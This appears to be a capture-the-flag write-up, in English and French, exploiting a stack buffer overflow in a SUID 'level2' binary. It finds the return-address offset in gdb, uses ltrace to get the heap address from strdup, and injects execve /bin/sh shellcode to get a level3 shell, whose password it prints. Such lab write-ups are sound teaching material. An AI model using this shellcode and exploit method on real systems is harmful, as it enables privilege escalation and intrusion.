- We have a 32 bit ELF binary called level2 with SUID bit set, let's decompile de code:

```bash
char* p()
{
    fflush(stdout);
    void buffer;
    gets(&buffer);
    
    if ((__return_addr & 0xb0000000) != 0xb0000000)
    {
        puts(&buffer);
        return strdup(&buffer);
    }
    
    printf("(%p)\n", __return_addr);
    _exit(1);
}

int32_t main(int32_t argc, char** argv, char** envp)
{
    return p();
}

```

-----

- Le but ici est de rentrer dans la condition, ensuite nous allons ecrire un shellcode dans notre buffer ET des NOP jusque EIP, On va ensuite ecraser EIP avec l'addresse de notre buffer et le shell code sera execute.

- Premierement trouvons l'offset de EIP

```bash
> gdb ./level2
> pattern create 200
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

- Executer le programme en donnant la chaine de caractere en entree utilisateur

> r <<< 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'

[+] EIP: 0x41414a41 ('AJAA')
- On sait maintenant que EIP est ecrase au pattern 'AJAA'de la chaine de caractere
- On peut maintenant connaitre l'offset de EIP a partir du buffer

gdb-peda$ pattern_offset AJAA
AJAA found at offset: 80
```

- Trouver l'addresse ou est stocke notre buffer sur la heap apres le strdup
```bash
> ltrace ./level02
ltrace ./level2 
__libc_start_main(0x804853f, 1, 0xbffff804, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20) = 0
gets(0xbffff70c, 0, 0, 0xb7e5ec73, 0x80482b5) = 0xbffff70c
puts("")    = 1
strdup("")  = 0x0804a008

[+] 0x0804a008
```



- Construction du Payload avec le shellcode

```bash
python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "A"*59 + "\x08\xa0\x04\x08"' > /tmp/payload

-> inserer le shellcode
-> Remplier la memoire avec n'importe quelle valeur jusque EIP
-> ecraser EIP avec addresse de buffer en little endian
```

- Run le programme avec notre payload
```bash
> (cat /tmp/payload ; cat) | ./level2
> id
euid=2022(level3)

> cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
















